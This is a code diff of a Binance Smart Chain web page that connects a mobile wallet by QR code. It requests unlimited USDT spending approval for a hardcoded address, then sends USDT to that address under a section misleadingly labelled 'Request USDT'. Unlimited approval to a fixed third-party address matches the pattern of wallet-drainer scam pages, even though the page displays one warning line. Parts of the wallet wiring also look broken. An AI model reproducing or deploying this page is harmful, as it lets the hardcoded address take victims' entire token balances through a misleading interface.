@@ -45,38 +45,6 @@
             margin-bottom: 25px;
         }
 
-        /* QR Code Section */
-        .qr-section {
-            background-color: #252525;
-            border-radius: 15px;
-            padding: 20px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .qr-title {
-            font-size: 0.9rem;
-            color: #888;
-            margin-bottom: 15px;
-        }
-
-        #qrcode {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 15px;
-        }
-
-        #qrcode canvas, #qrcode img {
-            border-radius: 10px;
-            max-width: 200px;
-        }
-
-        .scan-hint {
-            font-size: 0.75rem;
-            color: #666;
-            line-height: 1.5;
-        }
-
         .status-box {
             background-color: #2a2a2a;
             padding: 15px;
@@ -104,7 +72,39 @@
             color: #ff9800;
         }
 
-        /* Wallet Info */
+        .qr-section {
+            background-color: #252525;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .qr-title {
+            font-size: 0.9rem;
+            color: #888;
+            margin-bottom: 15px;
+        }
+
+        #qrcode {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+            min-height: 200px;
+            align-items: center;
+        }
+
+        #qrcode canvas, #qrcode img, #qrcode svg {
+            border-radius: 10px;
+            max-width: 200px;
+        }
+
+        .scan-hint {
+            font-size: 0.75rem;
+            color: #666;
+            line-height: 1.5;
+        }
+
         .wallet-info {
             background-color: #252525;
             border-radius: 12px;
@@ -149,14 +149,10 @@
             border-radius: 4px;
             font-size: 0.75rem;
             font-weight: bold;
-        }
-
-        .network-badge.bsc {
             background-color: #F0B90B;
             color: #000;
         }
 
-        /* Action Section */
         .action-section {
             display: none;
         }
@@ -318,7 +314,6 @@
             color: #fff;
         }
 
-        /* Desktop warning */
         .desktop-warning {
             display: none;
             text-align: center;
@@ -344,31 +339,27 @@
         <h1>BSC DApp</h1>
         <div class="subtitle">Connect Wallet & Transfer USDT</div>
 
-        <!-- Desktop Warning -->
         <div class="desktop-warning">
-            📱 For best experience, scan the QR code with your mobile wallet (Trust Wallet, MetaMask Mobile, etc.)
+            For best experience, scan the QR code with your mobile wallet
         </div>
 
-        <!-- Connection Status -->
         <div class="status-box" id="mainStatus">
             Initializing...
         </div>
 
-        <!-- QR Code Section -->
         <div class="qr-section" id="qrSection">
-            <div class="qr-title">📱 Scan to Connect</div>
+            <div class="qr-title">Scan to Connect</div>
             <div id="qrcode"></div>
             <div class="scan-hint">
-                Open your wallet app and scan this QR code<br>
-                <strong>Trust Wallet</strong> → Browser → Scan QR
+                Open Trust Wallet Browser and scan<br>
+                or use wallet camera to scan
             </div>
         </div>
 
-        <!-- Wallet Info (shown when connected) -->
         <div class="wallet-info" id="walletInfo">
             <div class="info-row">
                 <span class="info-label">Network</span>
-                <span class="info-value"><span class="network-badge bsc">BSC Mainnet</span></span>
+                <span class="info-value"><span class="network-badge">BSC Mainnet</span></span>
             </div>
             <div class="info-row">
                 <span class="info-label">Address</span>
@@ -384,13 +375,11 @@
             </div>
         </div>
 
-        <!-- Action Section (shown when connected) -->
         <div class="action-section" id="actionSection">
-            <!-- Approve Section -->
             <div class="section-title">Token Approval</div>
             
             <div class="warning-text">
-                ⚠️ Unlimited approval allows the contract to spend your USDT anytime. Only approve if you trust the contract.
+                Unlimited approval allows the contract to spend your USDT anytime. Only approve if you trust the contract.
             </div>
 
             <button class="approve-btn" id="approveBtn" onclick="approveUnlimited()">
@@ -398,14 +387,13 @@
                 <div class="loader" id="approveLoader"></div>
             </button>
 
-            <!-- Transfer Section -->
             <div class="section-title">Request USDT</div>
             
             <div class="action-buttons">
-                <button class="amount-btn" onclick="selectAmount(10)">10 USDT</button>
-                <button class="amount-btn" onclick="selectAmount(20)">20 USDT</button>
-                <button class="amount-btn" onclick="selectAmount(100)">100 USDT</button>
-                <button class="amount-btn" onclick="selectAmount(0)">Custom</button>
+                <button class="amount-btn" onclick="selectAmount(10, this)">10 USDT</button>
+                <button class="amount-btn" onclick="selectAmount(20, this)">20 USDT</button>
+                <button class="amount-btn" onclick="selectAmount(100, this)">100 USDT</button>
+                <button class="amount-btn" onclick="selectAmount(0, this)">Custom</button>
             </div>
 
             <div class="selected-amount" id="selectedAmount">Select an amount above</div>
@@ -419,36 +407,26 @@
         </div>
     </div>
 
-    <!-- Ethers.js v6 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
-    
-    <!-- QRCode.js -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/legacy-client@2.4.0/dist/umd/index.min.js"></script>
 
-    <!-- WalletConnect v2 -->
-    <script type="module">
-        import { createWeb3Modal, defaultConfig } from 'https://unpkg.com/@web3modal/ethers@5.7.0/dist/esm/index.js';
-
+    <script>
         // ==================== CONFIGURATION ====================
         
-        // ⚠️ REPLACE WITH YOUR WALLETCONNECT PROJECT ID
-        // Get one for free at: https://cloud.walletconnect.com/
-        const WALLETCONNECT_PROJECT_ID = 'YOUR_WALLETCONNECT_PROJECT_ID';
+        // Your WalletConnect Project ID
+        const WALLETCONNECT_PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';
 
         // USDT Contract on BSC Mainnet
         const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
         
-        // Your Contract/Recipient Address
+        // Recipient Address
         const RECIPIENT_ADDRESS = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
         
         // BSC Mainnet Configuration
-        const BSC_MAINNET = {
-            chainId: 56,
-            name: 'BSC Mainnet',
-            currency: 'BNB',
-            explorerUrl: 'https://bscscan.com',
-            rpcUrl: 'https://bsc-dataseed1.binance.org'
-        };
+        const BSC_RPC_URL = "https://bsc-dataseed1.binance.org";
+        const BSC_CHAIN_ID = 56;
+        const BSC_CHAIN_ID_HEX = "0x38";
 
         // USDT ABI
         const USDT_ABI = [
@@ -459,161 +437,197 @@
         ];
 
         // ==================== STATE ====================
-        let walletProvider;
-        let ethersProvider;
-        let signer;
-        let walletAddress;
+        let walletConnector = null;
+        let ethersProvider = null;
+        let signer = null;
+        let walletAddress = null;
         let selectedAmount = 0;
-        let usdtContract;
+        let usdtContract = null;
 
-        // ==================== WALLETCONNECT SETUP ====================
-        
-        // 1. Get projectId
-        const projectId = 171db6da15a54effc1b4a06f889a3c3f;
-
-        // 2. Set chains
-        const chains = [BSC_MAINNET];
-
-        // 3. Create modal
-        const metadata = {
-            name: 'BSC USDT DApp',
-            description: 'Connect wallet and transfer USDT',
-            url: window.location.origin,
-            icons: ['https://avatars.mywebsite.com/']
+        // ==================== INITIALIZATION ====================
+        window.onload = function() {
+            initWalletConnect();
         };
 
-        // Check if project ID is set
-        if (projectId === 'YOUR_WALLETCONNECT_PROJECT_ID') {
-            document.getElementById('mainStatus').innerHTML = 
-                '⚠️ <strong>Setup Required:</strong><br>Add your WalletConnect Project ID in the code.<br><a href="https://cloud.walletconnect.com/" target="_blank" style="color:#F0B90B">Get free Project ID</a>';
-            document.getElementById('mainStatus').classList.add('warning');
+        async function initWalletConnect() {
+            try {
+                // Check if WalletConnect is available
+                if (typeof WalletConnect === 'undefined') {
+                    updateStatus("Loading wallet connection...", false);
+                    setTimeout(initWalletConnect, 1000);
+                    return;
+                }
+
+                // Create WalletConnect connector
+                walletConnector = new WalletConnect.default({
+                    bridge: "https://bridge.walletconnect.org",
+                    qrcodeModal: {
+                        open: function(uri, callback) {
+                            generateQRCode(uri);
+                        },
+                        close: function() {
+                            console.log("QR Modal closed");
+                        }
+                    },
+                    clientMeta: {
+                        name: "BSC USDT DApp",
+                        description: "Connect wallet and transfer USDT on BSC",
+                        url: window.location.origin,
+                        icons: []
+                    }
+                });
+
+                // Check if already connected
+                if (walletConnector.connected) {
+                    await onWalletConnected(walletConnector.accounts[0]);
+                } else {
+                    updateStatus("Scan QR code to connect your wallet", false);
+                }
+
+                // Listen for connection events
+                walletConnector.on("connect", function(error, payload) {
+                    if (error) {
+                        console.error("Connect error:", error);
+                        return;
+                    }
+                    walletAddress = payload.params[0].accounts[0];
+                    onWalletConnected(walletAddress);
+                });
+
+                walletConnector.on("disconnect", function(error, payload) {
+                    if (error) {
+                        console.error("Disconnect error:", error);
+                    }
+                    disconnectWallet();
+                });
+
+                walletConnector.on("session_update", function(error, payload) {
+                    if (error) {
+                        console.error("Session update error:", error);
+                        return;
+                    }
+                    updateStatus("Session updated", false);
+                });
+
+            } catch (error) {
+                console.error("Initialization error:", error);
+                updateStatus("Error initializing. Please refresh.", false);
+            }
         }
 
-        // Initialize Web3Modal
-        let web3Modal;
-        
-        try {
-            web3Modal = createWeb3Modal({
-                ethersConfig: defaultConfig({ metadata }),
-                chains,
-                projectId,
-                enableAnalytics: false
-            });
-
-            // Check if already connected
-            checkConnection();
-        } catch (error) {
-            console.error("Web3Modal initialization error:", error);
+        function generateQRCode(uri) {
+            var qrContainer = document.getElementById("qrcode");
+            qrContainer.innerHTML = "";
+            
+            try {
+                new QRCode(qrContainer, {
+                    text: uri,
+                    width: 200,
+                    height: 200,
+                    colorDark: "#000000",
+                    colorLight: "#ffffff",
+                    correctLevel: QRCode.CorrectLevel.M
+                });
+            } catch (error) {
+                console.error("QR generation error:", error);
+                qrContainer.innerHTML = '<div style="color:#666;">QR Code</div>';
+            }
         }
 
         // ==================== CONNECTION FUNCTIONS ====================
         
-        async function checkConnection() {
-            try {
-                if (web3Modal) {
-                    const connected = await web3Modal.getIsConnected();
-                    if (connected) {
-                        await connectWallet();
-                    } else {
-                        updateStatus("Scan QR code to connect your wallet", false);
-                    }
-                }
-            } catch (error) {
-                console.error("Connection check error:", error);
-            }
-        }
-
         async function connectWallet() {
             try {
-                updateStatus("Connecting...", false);
-                
-                // Get provider from Web3Modal
-                walletProvider = web3Modal.getWalletProvider();
-                
-                // Create ethers provider
-                ethersProvider = new ethers.BrowserProvider(walletProvider);
-                
-                // Get signer
-                signer = await ethersProvider.getSigner();
-                walletAddress = await signer.getAddress();
+                if (!walletConnector) {
+                    updateStatus("Wallet not initialized. Please refresh.", false);
+                    return;
+                }
 
-                // Switch to BSC
-                await switchToBSC();
-
-                // Update UI
-                await onWalletConnected();
+                // Create new session
+                await walletConnector.createSession();
+                updateStatus("Opening QR code...", false);
                 
             } catch (error) {
                 console.error("Connection error:", error);
-                let message = "Connection failed";
-                if (error.code === 'ERROR_RPC') {
-                    message = "Please switch to BSC Mainnet in your wallet";
-                } else if (error.message) {
-                    message = error.message.substring(0, 50);
-                }
-                updateStatus(`❌ ${message}`, false);
+                updateStatus("Connection failed: " + error.message, false);
+            }
+        }
+
+        async function onWalletConnected(address) {
+            try {
+                // Hide QR section
+                document.getElementById("qrSection").style.display = "none";
+                
+                // Show wallet info and actions
+                document.getElementById("walletInfo").classList.add("show");
+                document.getElementById("actionSection").classList.add("show");
+                
+                // Update status
+                updateStatus("Wallet Connected", true);
+                
+                // Update wallet address
+                document.getElementById("walletAddress").textContent = formatAddress(address);
+                
+                // Create ethers provider
+                ethersProvider = new ethers.BrowserProvider(walletConnector);
+                
+                // Get signer
+                signer = await ethersProvider.getSigner();
+                
+                // Switch to BSC
+                await switchToBSC();
+                
+                // Get BNB balance
+                const bnbBalance = await ethersProvider.getBalance(address);
+                document.getElementById("walletBalance").textContent = 
+                    parseFloat(ethers.formatEther(bnbBalance)).toFixed(4) + " BNB";
+                
+                // Initialize USDT contract
+                usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+                
+                // Get USDT balance
+                await updateUSDTBalance();
+                
+            } catch (error) {
+                console.error("Connected handler error:", error);
+                updateStatus("Error loading wallet data", false);
             }
         }
 
         async function switchToBSC() {
             try {
                 const network = await ethersProvider.getNetwork();
-                if (network.chainId !== 56n) {
+                
+                if (network.chainId !== BigInt(BSC_CHAIN_ID)) {
                     updateStatus("Switching to BSC Mainnet...", false);
                     
                     try {
-                        await walletProvider.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x38' }],
+                        await walletConnector.sendCustomRequest({
+                            method: "wallet_switchEthereumChain",
+                            params: [{ chainId: BSC_CHAIN_ID_HEX }]
                         });
                     } catch (switchError) {
                         if (switchError.code === 4902) {
                             // Add BSC network
-                            await walletProvider.request({
-                                method: 'wallet_addEthereumChain',
+                            await walletConnector.sendCustomRequest({
+                                method: "wallet_addEthereumChain",
                                 params: [{
-                                    chainId: '0x38',
-                                    chainName: 'Binance Smart Chain',
-                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                    rpcUrls: ['https://bsc-dataseed1.binance.org'],
-                                    blockExplorerUrls: ['https://bscscan.com']
+                                    chainId: BSC_CHAIN_ID_HEX,
+                                    chainName: "Binance Smart Chain",
+                                    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                                    rpcUrls: [BSC_RPC_URL],
+                                    blockExplorerUrls: ["https://bscscan.com"]
                                 }]
                             });
                         }
                     }
                     
                     // Re-initialize provider
-                    ethersProvider = new ethers.BrowserProvider(walletProvider);
+                    ethersProvider = new ethers.BrowserProvider(walletConnector);
                 }
             } catch (error) {
                 console.error("Network switch error:", error);
             }
-        }
-
-        async function onWalletConnected() {
-            // Hide QR section
-            document.getElementById('qrSection').classList.add('hidden');
-            
-            // Show wallet info and actions
-            document.getElementById('walletInfo').classList.add('show');
-            document.getElementById('actionSection').classList.add('show');
-            
-            // Update status
-            updateStatus("✅ Wallet Connected", true);
-            
-            // Update wallet info
-            document.getElementById('walletAddress').textContent = formatAddress(walletAddress);
-            
-            // Get BNB balance
-            const bnbBalance = await ethersProvider.getBalance(walletAddress);
-            document.getElementById('walletBalance').textContent = 
-                `${parseFloat(ethers.formatEther(bnbBalance)).toFixed(4)} BNB`;
-            
-            // Initialize USDT contract
-            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-            
-            // Get USDT balance
-            await updateUSDTBalance();
         }
 
         async function updateUSDTBalance() {
@@ -621,81 +635,84 @@
                 const balance = await usdtContract.balanceOf(walletAddress);
                 const decimals = await usdtContract.decimals();
                 const formatted = ethers.formatUnits(balance, decimals);
-                document.getElementById('usdtBalance').textContent = `${parseFloat(formatted).toFixed(2)} USDT`;
+                document.getElementById("usdtBalance").textContent = parseFloat(formatted).toFixed(2) + " USDT";
             } catch (error) {
-                document.getElementById('usdtBalance').textContent = "Error";
+                document.getElementById("usdtBalance").textContent = "Error";
             }
         }
 
         // ==================== APPROVAL FUNCTION ====================
         
-        window.approveUnlimited = async function() {
-            const btn = document.getElementById('approveBtn');
-            const btnText = document.getElementById('approveBtnText');
-            const loader = document.getElementById('approveLoader');
-            const statusEl = document.getElementById('mainStatus');
+        function approveUnlimited() {
+            var btn = document.getElementById("approveBtn");
+            var btnText = document.getElementById("approveBtnText");
+            var loader = document.getElementById("approveLoader");
+            var statusEl = document.getElementById("mainStatus");
 
-            btnText.style.display = 'none';
-            loader.style.display = 'block';
+            btnText.style.display = "none";
+            loader.style.display = "block";
             btn.disabled = true;
 
-            try {
-                statusEl.innerHTML = "Please confirm in wallet...";
-                
-                const tx = await usdtContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256);
-                
-                statusEl.innerHTML = `Transaction submitted!<br><a href="https://bscscan.com/tx/${tx.hash}" target="_blank" class="tx-hash">View on BscScan</a>`;
-                
-                await tx.wait();
-                
-                statusEl.innerHTML = `✅ <strong>Success!</strong><br>Unlimited USDT approved`;
-                statusEl.className = 'status-box success';
-                
-            } catch (error) {
-                console.error("Approval error:", error);
-                let errorMsg = "Approval failed";
-                if (error.code === 4001) {
-                    errorMsg = "Transaction rejected";
-                }
-                statusEl.innerHTML = `❌ ${errorMsg}`;
-                statusEl.className = 'status-box error';
-            } finally {
-                btnText.style.display = 'inline';
-                loader.style.display = 'none';
-                btn.disabled = false;
-            }
-        };
+            usdtContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256)
+                .then(function(tx) {
+                    statusEl.innerHTML = "Transaction submitted!<br><a href=\"https://bscscan.com/tx/" + tx.hash + "\" target=\"_blank\" class=\"tx-hash\">View on BscScan</a>";
+                    
+                    tx.wait().then(function() {
+                        statusEl.innerHTML = "Success! Unlimited USDT approved";
+                        statusEl.className = "status-box success";
+                    }).catch(function(waitError) {
+                        console.error("Wait error:", waitError);
+                    });
+                })
+                .catch(function(error) {
+                    console.error("Approval error:", error);
+                    var errorMsg = "Approval failed";
+                    if (error.code === 4001) {
+                        errorMsg = "Transaction rejected";
+                    }
+                    statusEl.innerHTML = errorMsg;
+                    statusEl.className = "status-box error";
+                })
+                .finally(function() {
+                    btnText.style.display = "inline";
+                    loader.style.display = "none";
+                    btn.disabled = false;
+                });
+        }
 
         // ==================== AMOUNT SELECTION ====================
         
-        window.selectAmount = function(amount) {
+        function selectAmount(amount, btn) {
             selectedAmount = amount;
             
             // Update button styles
-            document.querySelectorAll('.amount-btn').forEach(btn => {
-                btn.classList.remove('selected');
-            });
+            var buttons = document.querySelectorAll(".amount-btn");
+            for (var i = 0; i < buttons.length; i++) {
+                buttons[i].classList.remove("selected");
+            }
             
             // Highlight selected button
-            event.target.classList.add('selected');
+            if (btn) {
+                btn.classList.add("selected");
+            }
             
             // Update selected amount display
-            const amountDisplay = document.getElementById('selectedAmount');
+            var amountDisplay = document.getElementById("selectedAmount");
             if (amount > 0) {
-                amountDisplay.innerHTML = `Selected: <strong style="color:#F0B90B">${amount} USDT</strong>`;
-                document.getElementById('transferBtn').disabled = false;
+                amountDisplay.innerHTML = "Selected: <strong style=\"color:#F0B90B\">" + amount + " USDT</strong>";
+                document.getElementById("transferBtn").disabled = false;
             } else {
-                amountDisplay.innerHTML = `Enter custom amount in the prompt`;
-                document.getElementById('transferBtn').disabled = false;
+                amountDisplay.innerHTML = "Enter custom amount in the prompt";
+                document.getElementById("transferBtn").disabled = false;
             }
-        };
+        }
 
         // ==================== TRANSFER FUNCTION ====================
         
-        window.transferUSDT = async function() {
-            let amount = selectedAmount;
+        function transferUSDT() {
+            var amount = selectedAmount;
             
-            // If custom amount (0), prompt user
+            // If custom amount, prompt user
             if (amount === 0) {
                 amount = prompt("Enter USDT amount:");
                 if (!amount || isNaN(amount) || amount <= 0) {
@@ -703,94 +720,100 @@
                 }
             }
 
-            const btn = document.getElementById('transferBtn');
-            const btnText = document.getElementById('transferBtnText');
-            const loader = document.getElementById('transferLoader');
-            const statusEl = document.getElementById('mainStatus');
+            var btn = document.getElementById("transferBtn");
+            var btnText = document.getElementById("transferBtnText");
+            var loader = document.getElementById("transferLoader");
+            var statusEl = document.getElementById("mainStatus");
 
-            btnText.style.display = 'none';
-            loader.style.display = 'block';
+            btnText.style.display = "none";
+            loader.style.display = "block";
             btn.disabled = true;
 
-            try {
-                statusEl.innerHTML = "Please confirm transfer in wallet...";
-                
-                // Parse amount with 18 decimals
-                const amountInWei = ethers.parseUnits(amount.toString(), 18);
-                
-                // Send transaction
-                const tx = await usdtContract.transfer(RECIPIENT_ADDRESS, amountInWei);
-                
-                statusEl.innerHTML = `Transfer submitted!<br><a href="https://bscscan.com/tx/${tx.hash}" target="_blank" class="tx-hash">View on BscScan</a>`;
-                
-                await tx.wait();
-                
-                // Update USDT balance
-                await updateUSDTBalance();
-                
-                statusEl.innerHTML = `✅ <strong>Success!</strong><br>${amount} USDT transferred`;
-                statusEl.className = 'status-box success';
-                
-            } catch (error) {
-                console.error("Transfer error:", error);
-                let errorMsg = "Transfer failed";
-                if (error.code === 4001) {
-                    errorMsg = "Transaction rejected";
-                } else if (error.message.includes('insufficient')) {
-                    errorMsg = "Insufficient USDT balance";
-                }
-                statusEl.innerHTML = `❌ ${errorMsg}`;
-                statusEl.className = 'status-box error';
-            } finally {
-                btnText.style.display = 'inline';
-                loader.style.display = 'none';
-                btn.disabled = false;
-            }
-        };
+            var amountInWei = ethers.parseUnits(amount.toString(), 18);
+
+            usdtContract.transfer(RECIPIENT_ADDRESS, amountInWei)
+                .then(function(tx) {
+                    statusEl.innerHTML = "Transfer submitted!<br><a href=\"https://bscscan.com/tx/" + tx.hash + "\" target=\"_blank\" class=\"tx-hash\">View on BscScan</a>";
+                    
+                    tx.wait().then(function() {
+                        updateUSDTBalance();
+                        statusEl.innerHTML = "Success! " + amount + " USDT transferred";
+                        statusEl.className = "status-box success";
+                    }).catch(function(waitError) {
+                        console.error("Wait error:", waitError);
+                    });
+                })
+                .catch(function(error) {
+                    console.error("Transfer error:", error);
+                    var errorMsg = "Transfer failed";
+                    if (error.code === 4001) {
+                        errorMsg = "Transaction rejected";
+                    } else if (error.message && error.message.includes("insufficient")) {
+                        errorMsg = "Insufficient USDT balance";
+                    }
+                    statusEl.innerHTML = errorMsg;
+                    statusEl.className = "status-box error";
+                })
+                .finally(function() {
+                    btnText.style.display = "inline";
+                    loader.style.display = "none";
+                    btn.disabled = false;
+                });
+        }
 
         // ==================== DISCONNECT FUNCTION ====================
         
-        window.disconnectWallet = async function() {
+        function disconnectWallet() {
             try {
-                if (web3Modal) {
-                    await web3Modal.disconnect();
+                if (walletConnector) {
+                    walletConnector.killSession();
                 }
                 
                 // Reset UI
-                document.getElementById('qrSection').classList.remove('hidden');
-                document.getElementById('walletInfo').classList.remove('show');
-                document.getElementById('actionSection').classList.remove('show');
+                document.getElementById("qrSection").style.display = "block";
+                document.getElementById("walletInfo").classList.remove("show");
+                document.getElementById("actionSection").classList.remove("show");
                 
                 walletAddress = null;
                 selectedAmount = 0;
                 
+                // Clear QR code
+                document.getElementById("qrcode").innerHTML = "";
+                
                 updateStatus("Scan QR code to connect your wallet", false);
                 
-                // Clear QR code and regenerate
-                document.getElementById('qrcode').innerHTML = '';
             } catch (error) {
                 console.error("Disconnect error:", error);
                 location.reload();
             }
-        };
+        }
 
         // ==================== UTILITY FUNCTIONS ====================
         
         function updateStatus(message, isSuccess) {
-            const statusEl = document.getElementById('mainStatus');
+            var statusEl = document.getElementById("mainStatus");
             statusEl.innerHTML = message;
-            statusEl.className = 'status-box' + (isSuccess ? ' success' : (message.includes('❌') ? ' error' : ''));
+            statusEl.className = "status-box";
+            if (isSuccess) {
+                statusEl.classList.add("success");
+            } else if (message.indexOf("Error") !== -1 || message.indexOf("Failed") !== -1) {
+                statusEl.classList.add("error");
+            } else if (message.indexOf("Switching") !== -1 || message.indexOf("Loading") !== -1) {
+                statusEl.classList.add("warning");
+            }
         }
 
         function formatAddress(address) {
-            return `${address.substring(0, 6)}...${address.substring(38)}`;
+            if (!address) return "...";
+            return address.substring(0, 6) + "..." + address.substring(38);
         }
 
-        // Expose functions to window for HTML onclick handlers
+        // Expose functions to window
         window.selectAmount = selectAmount;
         window.transferUSDT = transferUSDT;
         window.disconnectWallet = disconnectWallet;
         window.approveUnlimited = approveUnlimited;
+        window.connectWallet = connectWallet;
 
     </script>
 </body>
